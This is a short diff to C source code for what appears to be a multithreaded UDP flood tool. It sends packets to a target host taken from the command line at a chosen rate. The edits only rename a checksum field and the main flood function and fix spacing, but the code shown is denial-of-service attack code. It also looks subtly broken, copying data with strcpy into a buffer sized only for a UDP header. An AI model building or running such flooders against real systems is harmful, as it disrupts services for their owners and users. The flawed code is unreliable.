@@ -60,7 +60,7 @@ void *generate_udp_request(void *data)
 		char buf[sizeof(struct udphdr)];
 		memset(buf, 0x00, sizeof(struct udphdr));
 		udp_h_ptr = (struct udphdr *)buf;
-		udp_h_ptr->check = 0;
+		udp_h_ptr->checksum = 0;
 		udp_h_ptr->src_port = htons(0);
 		udp_h_ptr->dest_port = htons(g_udp_now_port);
 		strcpy(udp_h_ptr -> data, DATA);
@@ -93,7 +93,7 @@ void *udp_time_check(void *data)
 	return NULL;
 }
 
-void udp_flood_run(char *argv[])
+void udp_flood_main(char *argv[])
 {
 	int argc = 0;
 	while (argv[argc] != NULL) {
@@ -116,7 +116,7 @@ void udp_flood_run(char *argv[])
 	g_udp_request_per_sec = atoi(argv[3]);
 	int num_threads = 10;
 	pthread_t threads[9999];
-	printf("Sending UDP requests to %s using %d threads\n",argv[1], num_threads);
+	printf("Sending UDP requests to %s using %d threads\n", argv[1], num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
 		pthread_create(&threads[i], NULL, generate_udp_request, NULL);
